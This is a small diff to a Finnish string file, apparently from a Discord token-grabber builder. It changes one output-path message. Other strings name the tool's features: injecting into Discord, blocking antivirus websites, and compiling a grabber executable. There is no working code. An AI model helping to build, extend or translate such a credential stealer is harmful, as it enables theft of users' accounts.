@@ -253,7 +253,7 @@ Estä AV-sivustot (k/e)
 Discordin ruiskutus (k/e)
 Tiedostokuvake
 Luodaan {name}.exe, Tämä vie muutaman sekunnin. Kiitos kärsivällisyydestäsi!
-Tiedosto on 'output/grabberbuilder/{name}.exe:ssä
+Tiedosto on {path}
 Luotu ryhmäkeskustelu
 Rajoitettu nopeus ({response.json()['retry_after']}ms)
 Ei tarpeeksi ystäviä satunnaisvalintaan
